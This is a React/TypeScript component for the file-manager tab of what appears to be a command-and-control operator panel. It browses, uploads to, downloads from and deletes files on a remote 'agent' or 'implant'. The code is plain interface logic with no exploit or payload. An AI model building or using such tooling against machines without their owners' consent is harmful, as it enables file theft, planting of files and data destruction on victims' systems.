import { useEffect, useState } from "react";
import { clientService } from "@/services/clientService";
import type { ClientInfo } from "@/services/clientService";
import { isClientOnline } from "@/lib/os";
import { formatDate } from "@/lib/format";
import { Info, AlertTriangle } from "lucide-react";

type FileEntry = {
  name: string;
  is_dir: boolean;
  size: number;
  permissions: string;
  owner: string;
  group: string;
  modified: string | null;
  path: string;
};

type FileManagerTabProps = {
  clientId?: string;
  client?: ClientInfo | null;
};

function detectSeparator(osName?: string): "/" | "\\" {
  return osName?.toLowerCase().includes("win") ? "\\" : "/";
}

function defaultPathFor(osName?: string): string {
  return detectSeparator(osName) === "\\" ? "C:\\" : "/";
}

export default function FileManagerTab({ clientId, client }: FileManagerTabProps) {
  const initialPath = defaultPathFor(client?.os);
  const [currentPath, setCurrentPath] = useState(initialPath);
  const [pathInput, setPathInput] = useState(initialPath);
  const [files, setFiles] = useState<FileEntry[]>([]);
  const [hasLoaded, setHasLoaded] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [isUploading, setIsUploading] = useState(false);
  const [selectedFile, setSelectedFile] = useState<File | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [pendingDelete, setPendingDelete] = useState<FileEntry | null>(null);

  const isOnline = client ? isClientOnline(client.last_seen) : false;
  const noAgent = !clientId;
  const disabled = noAgent || !isOnline;

  useEffect(() => {
    if (clientId && isOnline) {
      loadDirectory(initialPath);
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [clientId, isOnline]);

  useEffect(() => {
    if (!pendingDelete) return;
    const onKey = (e: KeyboardEvent) => {
      if (e.key === "Escape" && !isLoading) setPendingDelete(null);
    };
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, [pendingDelete, isLoading]);

  const loadDirectory = async (path: string) => {
    if (!clientId) return;
    setIsLoading(true);
    setError(null);
    try {
      const res = await clientService.listFiles(clientId, path);
      if (res && res.success && res.data) {
        setFiles(res.data.entries || []);
        setCurrentPath(path);
        setPathInput(path);
        setHasLoaded(true);
      } else {
        setError(res?.message || "Failed to list directory.");
      }
    } catch (err: unknown) {
      console.error("Failed to load directory:", err);
      const message = err instanceof Error ? err.message : "Error communicating with C2 agent.";
      setError(message);
    } finally {
      setIsLoading(false);
    }
  };

  const handleBrowse = () => {
    loadDirectory(pathInput);
  };

  const handleGoParent = () => {
    const safe = currentPath;
    if (!safe) return;
    const separator = detectSeparator(client?.os);
    const isWindows = separator === "\\";
    if (isWindows) {
      if (/^[A-Za-z]:[\\/]?$/.test(safe)) return;
      const parts = safe.split(/[\\/]/).filter(Boolean);
      if (parts.length <= 1) {
        const drive = parts[0]?.match(/^[A-Za-z]:/)?.[0] ?? safe;
        loadDirectory(`${drive}\\`);
      } else {
        parts.pop();
        loadDirectory(parts.join("\\") + "\\");
      }
    } else {
      if (safe === "/") return;
      const parts = safe.split("/").filter(Boolean);
      if (parts.length <= 1) {
        loadDirectory("/");
      } else {
        parts.pop();
        loadDirectory("/" + parts.join("/"));
      }
    }
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files.length > 0) {
      setSelectedFile(e.target.files[0]);
    }
  };

  const handleUpload = async () => {
    if (!selectedFile || !clientId) return;
    setIsUploading(true);
    setError(null);

    try {
      const fileData = await selectedFile.arrayBuffer();
      const separator = detectSeparator(client?.os);
      const trailing = currentPath.endsWith(separator) ? "" : separator;
      const destPath =
        currentPath === separator
          ? `${separator}${selectedFile.name}`
          : `${currentPath}${trailing}${selectedFile.name}`;

      await clientService.uploadFile(clientId, destPath, fileData);
      setSelectedFile(null);
      loadDirectory(currentPath);
    } catch (err: unknown) {
      console.error("Upload failed:", err);
      const message = err instanceof Error ? err.message : "Failed to upload file.";
      setError(message);
    } finally {
      setIsUploading(false);
    }
  };

  const handleDownload = async (file: FileEntry) => {
    if (!clientId) return;
    setError(null);
    try {
      const url = clientService.getFileDownloadUrl(clientId, file.path);
      const response = await fetch(url, { credentials: "include" });
      if (!response.ok) {
        const text = await response.text().catch(() => "");
        throw new Error(text || `HTTP ${response.status} ${response.statusText}`);
      }
      const blob = await response.blob();
      const contentDisposition = response.headers.get("Content-Disposition") || "";
      const match = contentDisposition.match(/filename\*?=(?:UTF-8'')?"?([^";]+)"?/i);
      const downloadName = match?.[1] ? decodeURIComponent(match[1]) : file.name;

      const objectUrl = URL.createObjectURL(blob);
      const link = document.createElement("a");
      link.href = objectUrl;
      link.download = downloadName;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      setTimeout(() => URL.revokeObjectURL(objectUrl), 1000);
    } catch (err: unknown) {
      console.error("Download failed:", err);
      const message = err instanceof Error ? err.message : "Failed to download file.";
      setError(message);
    }
  };

  const handleDelete = async (file: FileEntry) => {
    if (!clientId) return;
    setPendingDelete(null);
    setIsLoading(true);
    setError(null);
    try {
      const res = await clientService.deleteFile(clientId, file.path);
      if (res && res.success) {
        loadDirectory(currentPath);
      } else {
        setError(res?.message || "Failed to delete file.");
      }
    } catch (err: unknown) {
      console.error("Delete failed:", err);
      const message = err instanceof Error ? err.message : "Failed to delete file.";
      setError(message);
    } finally {
      setIsLoading(false);
    }
  };

  const formatSize = (bytes: number) => {
    if (!bytes) return "0 B";
    const k = 1024;
    const sizes = ["B", "KB", "MB", "GB", "TB"];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + " " + sizes[i];
  };

  return (
    <div className="space-y-4 font-mono">
      {noAgent && (
        <div className="p-2.5 border border-yellow-500/50 bg-yellow-950/20 text-yellow-300 font-mono text-xs rounded flex items-center gap-2">
          <Info size={14} className="shrink-0" />
          <span>NO AGENT SELECTED. Pilih agent dari dashboard untuk mengakses file manager.</span>
        </div>
      )}
      {!noAgent && !isOnline && (
        <div className="p-2.5 border border-red-500/50 bg-red-950/20 text-red-400 font-mono text-xs rounded flex items-start gap-2">
          <Info size={14} className="shrink-0 mt-0.5" />
          <span>
            AGENT OFFLINE. File operations butuh implant aktif. Last seen:{" "}
            {formatDate(client?.last_seen)}.
          </span>
        </div>
      )}

      <div className="flex flex-col sm:flex-row gap-3">
        <input
          type="text"
          value={pathInput}
          onChange={(e) => setPathInput(e.target.value)}
          onKeyDown={(e) => e.key === "Enter" && !disabled && handleBrowse()}
          className="flex-1 rounded-md border border-green/30 bg-[#161a1d]/50 px-3 py-2 text-gray-300 outline-none focus:border-green transition-colors disabled:opacity-50"
          placeholder={defaultPathFor(client?.os)}
          disabled={disabled}
        />
        <div className="flex gap-3">
          <button
            onClick={handleBrowse}
            disabled={disabled || isLoading}
            className="flex-1 rounded-md border border-green/30 bg-transparent px-4 py-2 text-white hover:bg-green/10 transition-colors cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {isLoading ? "Loading..." : "Browse"}
          </button>
          <button
            onClick={handleGoParent}
            disabled={disabled || isLoading}
            className="flex-1 rounded-md border border-green/30 bg-transparent px-4 py-2 text-white hover:bg-green/10 transition-colors whitespace-nowrap cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
          >
            Go to Parent
          </button>
        </div>
      </div>

      {error && (
        <div className="p-3 border border-red-500/50 bg-red-950/20 text-red-400 font-mono text-xs rounded relative whitespace-pre-wrap break-words">
          [ERROR] FILE_MANAGER_FAULT: {error}
        </div>
      )}

      <div className="rounded-md border border-green/30 p-3 sm:p-4 bg-[#0B0F0B]">
        <h2 className="mb-3 text-sm uppercase tracking-wider font-semibold text-green">File Upload</h2>
        <div className="flex flex-col sm:flex-row items-start sm:items-center gap-3">
          <div className="flex items-center gap-3 w-full sm:w-auto">
            <label className={`rounded-md border border-green/30 bg-[#111811] px-4 py-1.5 text-white transition-colors whitespace-nowrap text-sm ${disabled ? "opacity-50 cursor-not-allowed" : "cursor-pointer hover:bg-green/10"}`}>
              Choose File
              <input
                type="file"
                onChange={handleFileChange}
                disabled={disabled || isUploading}
                className="hidden"
              />
            </label>
            <span className="text-gray-400 text-sm truncate max-w-[200px]">
              {selectedFile ? selectedFile.name : "No file selected"}
            </span>
          </div>
          <div className="flex-1 hidden sm:block" />
          <button
            onClick={handleUpload}
            disabled={disabled || isUploading || !selectedFile}
            className="w-full sm:w-auto rounded-md bg-green px-4 py-1.5 font-semibold text-[#0B0F0B] hover:bg-green/90 transition-colors disabled:opacity-50 disabled:cursor-not-allowed cursor-pointer"
          >
            {isUploading ? "Uploading..." : "Upload"}
          </button>
        </div>
      </div>

      <div className="rounded-md border border-green/30 p-3 sm:p-4 bg-[#0B0F0B]">
        <h2 className="mb-3 text-sm uppercase tracking-wider font-semibold text-green">
          Directory Contents ({currentPath})
        </h2>
        <div className="overflow-x-auto pr-2 custom-scrollbar">
          {isLoading ? (
            <div className="text-center py-8 text-green animate-pulse text-sm">
              LOADING DIRECTORY CONTENTS...
            </div>
          ) : !hasLoaded ? (
            <div className="text-gray-500 text-sm italic text-center py-8 border border-dashed border-green/20 rounded-md">
              {disabled
                ? "Agent unavailable."
                : `Enter a path above and press "Browse" to list directory contents (try ${defaultPathFor(client?.os)}).`}
            </div>
          ) : files.length === 0 ? (
            <div className="text-gray-500 text-sm italic text-center py-8 border border-dashed border-green/20 rounded-md">
              Empty directory.
            </div>
          ) : (
            <table className="w-full text-left text-sm whitespace-nowrap">
              <thead>
                <tr className="border-b border-green/30">
                  <th className="pb-2 pr-4 font-medium text-white">Name</th>
                  <th className="pb-2 pr-4 font-medium text-white">Type</th>
                  <th className="pb-2 pr-4 font-medium text-white">Size</th>
                  <th className="pb-2 pr-4 font-medium text-white">Permissions</th>
                  <th className="pb-2 pr-4 font-medium text-white">Owner</th>
                  <th className="pb-2 pr-4 font-medium text-white">Modified</th>
                  <th className="pb-2 font-medium text-white">Actions</th>
                </tr>
              </thead>
              <tbody>
                {files.map((file, i) => {
                  const isDir = file.is_dir;
                  const ownerLabel =
                    file.owner || file.group ? `${file.owner || ""} : ${file.group || ""}` : "-";
                  const dateLabel = formatDate(file.modified);

                  return (
                    <tr
                      key={`${file.path}-${i}`}
                      className="border-b border-green/30 last:border-0 hover:bg-green/5 transition-colors"
                    >
                      <td className="py-2 pr-4 text-green font-medium max-w-[240px] truncate" title={file.name}>
                        {isDir ? "📁" : "📄"} {file.name}
                      </td>
                      <td className="py-2 pr-4 text-green">{isDir ? "Dir" : "File"}</td>
                      <td className="py-2 pr-4 text-green">
                        {isDir ? "-" : formatSize(file.size)}
                      </td>
                      <td className="py-2 pr-4 text-green">{file.permissions || "-"}</td>
                      <td className="py-2 pr-4 text-green">{ownerLabel}</td>
                      <td className="py-2 pr-4 text-green whitespace-pre-line leading-relaxed">
                        {dateLabel}
                      </td>
                      <td className="py-2">
                        <div className="flex gap-2">
                          {isDir ? (
                            <button
                              onClick={() => loadDirectory(file.path)}
                              className="rounded border border-green px-2 py-0.5 text-xs text-green hover:bg-green/10 transition-colors cursor-pointer"
                            >
                              Open
                            </button>
                          ) : (
                            <button
                              onClick={() => handleDownload(file)}
                              disabled={isLoading}
                              className="rounded border border-green px-2 py-0.5 text-xs text-green hover:bg-green/10 transition-colors cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
                            >
                              Download
                            </button>
                          )}
                          <button
                            onClick={() => setPendingDelete(file)}
                            className="rounded border border-red-600 px-2 py-0.5 text-xs text-red-600 hover:bg-red-600/10 transition-colors cursor-pointer"
                          >
                            Delete
                          </button>
                        </div>
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          )}
        </div>
      </div>

      {pendingDelete && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm"
          onClick={() => !isLoading && setPendingDelete(null)}
          role="dialog"
          aria-modal="true"
          aria-labelledby="delete-modal-title"
        >
          <div
            className="relative w-full max-w-md border-2 border-red-600/60 bg-[#0B0F0B] text-green font-mono rounded-lg p-6 shadow-[0_0_30px_rgba(220,38,38,0.25)]"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="flex items-center gap-2 text-red-500 text-base uppercase tracking-wider mb-2">
              <AlertTriangle size={18} />
              <h2 id="delete-modal-title" className="font-semibold">Confirm Deletion</h2>
            </div>
            <p className="text-gray-400 text-xs leading-relaxed mb-4">
              This action cannot be undone. The following entry will be permanently removed from the agent's filesystem.
            </p>

            <div className="bg-[#111811] border border-green/30 rounded p-3 space-y-1 mb-5">
              <div className="text-[10px] text-gray-500 uppercase tracking-wider">Entry</div>
              <div className="text-sm text-green break-all font-semibold">
                {pendingDelete.is_dir ? "📁" : "📄"} {pendingDelete.name}
              </div>
              <div className="text-[10px] text-gray-500 uppercase tracking-wider mt-2">Path</div>
              <div className="text-xs text-green break-all">{pendingDelete.path}</div>
            </div>

            <div className="flex flex-col-reverse sm:flex-row sm:justify-end gap-2">
              <button
                type="button"
                onClick={() => setPendingDelete(null)}
                disabled={isLoading}
                className="px-4 py-2 rounded border border-green/40 bg-transparent text-white hover:bg-green/10 hover:text-green font-mono text-sm transition-colors cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
              >
                Cancel
              </button>
              <button
                type="button"
                onClick={() => handleDelete(pendingDelete)}
                disabled={isLoading}
                className="px-4 py-2 rounded border border-red-600 bg-red-600/20 text-red-500 hover:bg-red-600 hover:text-white font-mono text-sm transition-colors cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isLoading ? "Deleting..." : "Delete Permanently"}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
